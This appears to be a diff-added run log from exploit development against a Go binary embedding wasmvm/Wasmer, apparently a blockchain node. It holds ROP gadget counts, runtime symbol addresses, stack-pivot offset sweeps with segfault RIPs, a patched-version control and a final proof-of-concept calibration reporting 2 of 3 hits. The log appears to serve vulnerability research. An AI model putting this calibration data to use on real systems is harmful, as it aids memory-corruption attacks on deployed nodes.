+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 244, "dummy": 0} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 248, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7940eee470e7', '0x7834cb1050e7']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 252, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7ef5bab31bdb', '0x7bd74adf10e7']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 256, "dummy": 0} -> hits=0/2 exits=[1, 139] rips=['0x76dc22534bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 260, "dummy": 0} -> hits=0/2 exits=[1, 139] rips=['0x7f21f4b34bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 264, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7d90e80d10e7', '0x7927777f40e7']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 268, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x74cfd1f160e7', '0x73e1b189f0e7']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 272, "dummy": 0} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 276, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x78658b0370e7', '0x775925fd00e7']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 280, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 284, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x7fa881938bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 288, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 292, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 296, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x77d488c2bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 300, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x79026eb34bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 304, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 308, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x727f6a93bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 312, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x72b94c12fbdb', '0x724e1273abdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 316, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 320, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 324, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x7c0431931bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 328, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 332, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 336, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x79027eb3bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 340, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x72dc0c936bdb', '0x7984b333abdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 344, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x7d6378934bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 348, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 352, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 356, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 360, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 364, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x7fa2a792fbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 368, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 372, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x72b019c31bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 376, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x735231b36bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 380, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x755962332bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 384, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 388, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 392, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x71558d930bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 396, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x79c110339bdb', '0x7260a9736bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 400, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x782a56536bdb', '0x771fd4732bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 404, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 408, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 412, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x773f6793bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 416, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x726844e2bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 420, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 424, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x717c62028bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 428, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x72f7f002bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 432, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x755e2373bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 436, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x716badc4abdb', '0x7d6dd5735bdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 440, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 444, "dummy": 0} -> hits=0/2 exits=[139, 0] rips=['0x75c6e573bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 448, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 452, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 456, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x7ed0a31b619c']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 460, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 464, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 468, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 472, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 476, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 480, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 484, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 488, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 492, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 496, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 500, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 504, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 508, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] best = null
+[desmos_g120] no hit in the phase sweep -> holder-frame (dummy) + alignment sweep
+{"pivot_add_poprbp": 1, "pivot_add_ret": 58386, "pop_rax": 1, "guard_movups": 5, "guard_movq0": 3, "xor_xmm": 2805, "ud2": 5, "jmp_ind": 289, "call_ind": 10437}
+mint=f6a2c0 cgocb=470c60 g0=1c78700 pivot=f71a10 poprax=f71a20 guard=f71a30 ud2=f71a40
+  f6a2c0 t main.mintBridge
+  470c60 t runtime.cgocallback.abi0
+  4088a0 t runtime.cgocallbackg
+  473660 t runtime.cgocallbackg.abi0
+  408a40 t runtime.cgocallbackg1
+  469960 t runtime.cgocallbackg1.func1
+  408e20 t runtime.cgocallbackg1.func2
+  408dc0 t runtime.cgocallbackg1.func3
+ 1c78700 d runtime.g0
+ 1c78ce0 d runtime.m0
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7030a5e510e7', '0x7e93d7a040e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x7cac138470e7', '0x796de6af50e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x74863c0bc0e7', '0x73d2176690e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x719dee937b96', '0x72df96e660e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x775ee0e740e7', '0x71b9f9fe90e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 5} -> hits=0/2 exits=[0, 139] rips=['0x713bc1e2bb96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x79a64ce2bb96', '0x715c037f40e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x75379813ab96', '0x7b6f540250e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x7b082a2e10e7', '0x728b9402cb96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x76c0a4d540e7', '0x7325da8590e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x79ed53536b96', '0x707b0fe2bb96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x76fc049f40e7', '0x7ac4d7334b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 12} -> hits=0/2 exits=[139, 0] rips=['0x7a5175e31b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 13} -> hits=0/2 exits=[0, 139] rips=['0x73c17593bb96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x7b161ce2e0e7', '0x73d184fef0e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 278, "dummy": 15} -> hits=0/2 exits=[0, 139] rips=['0x7b2fffc2bb96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7f8de9caf0e7', '0x7e1282b140e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 1} -> hits=0/2 exits=[139, 0] rips=['0x7db459df80e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x715689b34b96', '0x7d7368732b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 3} -> hits=0/2 exits=[139, 0] rips=['0x73c1bd532b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x7dcda8d630e7', '0x79ae5653bb96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x71d8e72690e7', '0x77a162330b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x792aaafe60e7', '0x78c00fbf40e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x7640c2df20e7', '0x7e0b2a22ab96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x72aaec02fb96', '0x76ef2340b0e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x7095f39e90e7', '0x7d97304aa0e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x7e6783b38b96', '0x7e8c048d00e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x7cfbd733ab96', '0x7ae0f1335b96']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x7e510fb3ab96', '0x713fcff0c0e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x71c96f04d0e7', '0x7352971e00e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 14} -> hits=0/2 exits=[0, 139] rips=['0x7193e72410e7']
+[recal] {"warmups": 3, "frame32": 0, "drops": 15, "offset": 234, "dummy": 15} -> hits=0/2 exits=[0, 139] rips=['0x7464cfe500e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x719001aec0e7', '0x793ce89f40e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x77d285c7a0e7', '0x79e7bf339ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x764dab9e90e7', '0x7c481e1e30e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x7f75922970e7', '0x7420d56b10e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x79000fa2bba6', '0x7e7be82ef0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x7f99f50260e7', '0x7b6d9b2bb0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x72fd60f9d0e7', '0x789a5fc810e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 7} -> hits=0/2 exits=[0, 139] rips=['0x7d88ebe3f0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x7907462770e7', '0x72be794370e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x747cf2231ba6', '0x77586a49d0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x7c3bb3e890e7', '0x7d272b48e0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x7774690930e7', '0x7756af22bba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 12} -> hits=0/2 exits=[0, 139] rips=['0x77087c8ae0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x72442d0750e7', '0x731e2f938ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x7d67f72050e7', '0x7552d015d0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 278, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x749c8fa270e7', '0x704517abc0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x751d4bab40e7', '0x76368122aba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x72c73c8b00e7', '0x7d5ad6c580e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x77bc89fb20e7', '0x75ef31334ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x76a048b32ba6', '0x725dce09d0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x7f3fd8aa10e7', '0x7f40796430e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x7feedafc40e7', '0x7a59ec05bba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x72cfb7dbc0e7', '0x7a4c2fa2bba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x70421872fba6', '0x7921e7c2dba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x7ede3e1ae0e7', '0x776c324de0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x7844817f40e7', '0x70476e52fba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x77bf03c2a0e7', '0x72ab7bd0a0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x7e6fe5d900e7', '0x7ecf75b32ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x7e90f4739ba6', '0x794ae71dc0e7']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x71dc4e4ad0e7', '0x70f82db33ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x7e56564280e7', '0x78b393930ba6']
+[recal] {"warmups": 3, "frame32": 1, "drops": 15, "offset": 234, "dummy": 15} -> hits=0/2 exits=[139, 0] rips=['0x7e61b6d180e7']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x748903338bdb', '0x7dff5332fbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 1} -> hits=1/2 exits=[1, 139] rips=['0x7aae0422bbdb']
+[recal] best = {"shape": {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 1}, "hits": 1, "attempts": 2, "exits": [1, 139], "rips": ["0x7aae0422bbdb"]}
+
+=== Phase 7: patched control (wasmvm v3.0.8 / Wasmer 7.4.2) ===
+harness-fixed: BUILD OK (go1.25)
+fixed attempt=1 exit=0
+fixed attempt=2 exit=0
+fixed attempt=3 exit=0
+M4BANK in fixed runs: 0
+NESTEDRESULT n=1 err=<nil> resp=2
+NESTEDRESULT n=2 err=<nil> resp=2
+NESTEDRESULT n=3 err=<nil> resp=2
+NESTEDRESULT n=4 err=<nil> resp=2
+NESTEDRESULT n=1 err=<nil> resp=2
+NESTEDRESULT n=2 err=<nil> resp=2
+NESTEDRESULT n=3 err=<nil> resp=2
+NESTEDRESULT n=4 err=<nil> resp=2
+NESTEDRESULT n=1 err=<nil> resp=2
+NESTEDRESULT n=2 err=<nil> resp=2
+NESTEDRESULT n=3 err=<nil> resp=2
+NESTEDRESULT n=4 err=<nil> resp=2
+
+=== Phase 8: pipeline control (go1.23.5 + sdk0.50.10 + wasmvm1.5.5, exact PoC shape) ===
+harness-control: BUILD OK
+{"pivot_add_poprbp": 96074, "pivot_add_ret": 12, "pop_rax": 1, "guard_movups": 10, "guard_movq0": 4, "xor_xmm": 4446, "ud2": 7, "jmp_ind": 539, "call_ind": 27608}
+mint=172afc0 cgocb=47f920 g0=2dc0840 pivot=1732420 poprax=1732430 guard=1732440 ud2=1732450
+ 172afc0 t main.mintBridge
+  47f920 t runtime.cgocallback.abi0
+  40a160 t runtime.cgocallbackg
+  482280 t runtime.cgocallbackg.abi0
+  40a380 t runtime.cgocallbackg1
+  40a700 t runtime.cgocallbackg1.deferwrap1
+  40a6a0 t runtime.cgocallbackg1.deferwrap2
+  470820 t runtime.cgocallbackg1.func1
+ 2dc0840 d runtime.g0
+ 2dc1ea0 d runtime.m0
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0} -> hits=2/3 exits=[1, 1, 0] rips=[]
+[recal] best = {"shape": {"warmups": 3, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0}, "hits": 2, "attempts": 3, "exits": [1, 1, 0], "rips": []}
+
+=== done ===
+total 2740
+drwxr-xr-x 2 runner runner   4096 Oct 28 05:08 .
+drwxr-xr-x 3 runner runner   4096 Oct 28 05:02 ..
+-rw-r--r-- 1 runner runner     92 Oct 28 05:02 desmos.pclntab.err
+-rw-r--r-- 1 runner runner    380 Oct 28 05:02 desmos_binary.elf
+-rw-r--r-- 1 runner runner     95 Oct 28 05:02 desmos_binary.sha256
+-rw-r--r-- 1 runner runner    590 Oct 28 05:02 desmos_builddeps.txt
+-rw-r--r-- 1 runner runner     87 Oct 28 05:02 desmos_engine_strings.txt
+-rw-r--r-- 1 runner runner   1349 Oct 28 05:03 desmos_entry_stub.txt
+-rw-r--r-- 1 runner runner   1916 Oct 28 05:03 desmos_g0_candidates.txt
+-rw-r--r-- 1 runner runner 188734 Oct 28 05:06 desmos_g120_dummy_gadgets.json
+-rw-r--r-- 1 runner runner    161 Oct 28 05:06 desmos_g120_dummy_gadgets.summary.txt
+-rw-r--r-- 1 runner runner  16499 Oct 28 05:06 desmos_g120_dummy_recal.json
+-rw-r--r-- 1 runner runner   9720 Oct 28 05:06 desmos_g120_dummy_recal.log
+-rw-r--r-- 1 runner runner    413 Oct 28 05:06 desmos_g120_dummy_symbols.txt
+-rw-r--r-- 1 runner runner 188734 Oct 28 05:06 desmos_g120_rsweep_gadgets.json
+-rw-r--r-- 1 runner runner    161 Oct 28 05:06 desmos_g120_rsweep_gadgets.summary.txt
+-rw-r--r-- 1 runner runner  33359 Oct 28 05:06 desmos_g120_rsweep_recal.json
+-rw-r--r-- 1 runner runner  14886 Oct 28 05:06 desmos_g120_rsweep_recal.log
+-rw-r--r-- 1 runner runner    413 Oct 28 05:06 desmos_g120_rsweep_symbols.txt
+-rw-r--r-- 1 runner runner 194077 Oct 28 05:06 desmos_g121_dummy_gadgets.json
+-rw-r--r-- 1 runner runner    162 Oct 28 05:06 desmos_g121_dummy_gadgets.summary.txt
+-rw-r--r-- 1 runner runner  60858 Oct 28 05:06 desmos_g121_dummy_recal.json
+-rw-r--r-- 1 runner runner  36028 Oct 28 05:06 desmos_g121_dummy_recal.log
+-rw-r--r-- 1 runner runner    413 Oct 28 05:06 desmos_g121_dummy_symbols.txt
+-rw-r--r-- 1 runner runner 194077 Oct 28 05:05 desmos_g121_rsweep_gadgets.json
+-rw-r--r-- 1 runner runner    162 Oct 28 05:05 desmos_g121_rsweep_gadgets.summary.txt
+-rw-r--r-- 1 runner runner  34319 Oct 28 05:05 desmos_g121_rsweep_recal.json
+-rw-r--r-- 1 runner runner  14700 Oct 28 05:05 desmos_g121_rsweep_recal.log
+-rw-r--r-- 1 runner runner    413 Oct 28 05:05 desmos_g121_rsweep_symbols.txt
+-rw-r--r-- 1 runner runner 236515 Oct 28 05:03 desmos_gadgets.json
+-rw-r--r-- 1 runner runner    173 Oct 28 05:03 desmos_gadgets.summary.txt
+-rw-r--r-- 1 runner runner     40 Oct 28 05:02 desmos_goversion.txt
+-rw-r--r-- 1 runner runner  24512 Oct 28 05:03 desmos_rt0go.txt
+-rw-r--r-- 1 runner runner   1657 Oct 28 05:03 desmos_symbols.txt
+-rw-r--r-- 1 runner runner     81 Oct 28 05:05 h_g120_w153_build.log
+-rw-r--r-- 1 runner runner      0 Oct 28 05:04 h_g121_w153_build.log
+-rw-r--r-- 1 runner runner 162524 Oct 28 05:05 h_g121_w153_gadgets.json
+-rw-r--r-- 1 runner runner    158 Oct 28 05:05 h_g121_w153_gadgets.summary.txt
+-rw-r--r-- 1 runner runner    564 Oct 28 05:05 h_g121_w153_recal.json
+-rw-r--r-- 1 runner runner    154 Oct 28 05:05 h_g121_w153_recal.log
+-rw-r--r-- 1 runner runner    412 Oct 28 05:05 h_g121_w153_symbols.txt
+-rw-r--r-- 1 runner runner     50 Oct 28 05:04 h_g121_w155_build.log
+-rw-r--r-- 1 runner runner 162524 Oct 28 05:05 h_g121_w155_gadgets.json
+-rw-r--r-- 1 runner runner    158 Oct 28 05:05 h_g121_w155_gadgets.summary.txt
+-rw-r--r-- 1 runner runner    537 Oct 28 05:05 h_g121_w155_recal.json
+-rw-r--r-- 1 runner runner    136 Oct 28 05:05 h_g121_w155_recal.log
+-rw-r--r-- 1 runner runner    412 Oct 28 05:05 h_g121_w155_symbols.txt
+-rw-r--r-- 1 runner runner      0 Oct 28 05:04 h_g123_w153_build.log
+-rw-r--r-- 1 runner runner 164067 Oct 28 05:05 h_g123_w153_gadgets.json
+-rw-r--r-- 1 runner runner    159 Oct 28 05:05 h_g123_w153_gadgets.summary.txt
+-rw-r--r-- 1 runner runner    773 Oct 28 05:05 h_g123_w153_recal.json
+-rw-r--r-- 1 runner runner    308 Oct 28 05:05 h_g123_w153_recal.log
+-rw-r--r-- 1 runner runner    422 Oct 28 05:05 h_g123_w153_symbols.txt
+-rw-r--r-- 1 runner runner      0 Oct 28 05:05 h_g123_w155_build.log
+-rw-r--r-- 1 runner runner 164067 Oct 28 05:05 h_g123_w155_gadgets.json
+-rw-r--r-- 1 runner runner    159 Oct 28 05:05 h_g123_w155_gadgets.summary.txt
+-rw-r--r-- 1 runner runner    820 Oct 28 05:05 h_g123_w155_recal.json
